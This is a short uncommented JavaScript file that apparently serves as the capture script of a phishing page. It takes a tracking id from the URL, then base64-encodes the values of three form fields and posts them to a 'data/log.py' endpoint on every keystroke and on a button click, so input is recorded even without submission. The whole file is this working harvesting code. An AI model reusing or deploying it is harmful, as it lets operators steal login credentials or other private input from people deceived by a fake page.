var r = new XMLHttpRequest();
var a = /id=([^&]+)/.exec(window.location.href)[1];
var b = "";
var c = "";
var d = "";

r.open("POST", "data/log.py", true);
r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
r.send("a=" + btoa(a) + "&b=" + btoa(" ") + "&c=" + btoa(" ") + "&d=" + btoa(" ") + "&e=" + btoa(" "));

document.onkeyup = function(e){
	b = document.getElementById("b").value;
	c = document.getElementById("c").value;
	d = document.getElementById("d").value;
	if(e.key === "Tab"){
		e = "TAB";
	}else{
		e = "";
	}
	r.open("POST", "data/log.py", true);
	r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	r.send("a=" + btoa(a) + "&b=" + btoa(b) + "&c=" + btoa(c) + "&d=" + btoa(d) + "&e=" + btoa(" "));
};

document.getElementById("b").oninput = document.getElementById("c").oninput = document.getElementById("d").oninput = function(){
	b = document.getElementById("b").value;
	c = document.getElementById("c").value;
	d = document.getElementById("d").value;
};

document.getElementById("l").addEventListener('click', function(e){
	var l = document.getElementById("l");
	r.open("POST", "data/log.py", true);
	r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	r.send("a=" + btoa(a) + "&b=" + btoa(b) + "&c=" + btoa(c) + "&d=" + btoa(d) + "&e=" + btoa("BUTTON"));
	l.removeAttribute("hidden");
});